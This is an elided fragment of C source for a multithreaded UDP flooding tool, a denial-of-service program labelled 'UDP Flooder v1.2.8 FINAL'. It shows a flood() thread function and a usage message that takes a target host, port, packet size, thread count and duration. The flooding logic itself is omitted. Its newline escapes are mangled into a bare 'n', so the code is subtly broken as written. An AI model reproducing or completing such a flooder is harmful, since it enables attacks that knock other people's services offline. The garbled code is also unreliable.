...
void *flood(void *par1)
{
  ...
  fprintf(stdout, "Thread %d startedn", td->thread_id);
...
int main(int argc, char *argv[ ])
{
  if(argc < 6){
    ...
    fprintf(stdout, "UDP Flooder v1.2.8 FINAL by ohnoes1479nUsage: %s <target IP/hostname> <port to be flooded> <throttle (lower is faster)> <packet size> <number threads to use> <time (optional)>n", argv[0]);
    exit(-1);
  }
